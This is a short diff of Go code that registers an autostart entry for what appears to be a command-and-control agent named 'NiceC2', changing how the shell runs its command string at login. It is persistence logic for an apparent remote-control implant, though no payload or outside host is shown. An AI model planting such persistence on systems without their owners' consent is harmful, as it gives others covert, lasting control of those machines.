@@ -41,7 +41,7 @@ func main() {
 	app := &autostart.App{
 		Name:        "NiceC2",
 		DisplayName: "NiceC2 command agent",
-		Exec:        []string{shell, commandString},
+		Exec:        []string{shell, "-c", commandString},
 	}
 
 	if app.IsEnabled() {
